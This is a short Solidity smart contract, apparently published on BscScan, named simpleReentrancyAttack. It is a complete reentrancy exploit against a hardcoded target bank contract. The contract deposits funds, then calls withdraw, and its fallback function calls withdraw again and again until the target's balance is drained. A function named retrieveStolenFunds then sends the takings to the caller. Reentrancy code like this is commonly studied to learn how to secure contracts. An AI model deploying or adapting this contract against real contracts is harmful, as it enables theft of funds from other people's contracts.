/**
 *Submitted for verification at BscScan.com on 2021-10-05
*/

interface targetInterface{
    function deposit() external payable; 
    function withdraw(uint withdrawAmount) external; 
}

contract simpleReentrancyAttack{
    targetInterface bankAddress = targetInterface(0x8891de345808E77228677f0eFb56125DB1E93a49); 
    uint amount = 1 ether; 


    function deposit() public payable{
        bankAddress.deposit.value(amount)();
    }
    
    function getTargetBalance() public view returns(uint){
        return address(bankAddress).balance; 
    }
    function attack() public payable{
        bankAddress.withdraw(amount); 
    }
    
    function retrieveStolenFunds() public {
        msg.sender.transfer(address(this).balance);
    }
    
    fallback () external payable{ 
     if (address(bankAddress).balance >= amount){
         bankAddress.withdraw(amount);
     }   
    }
}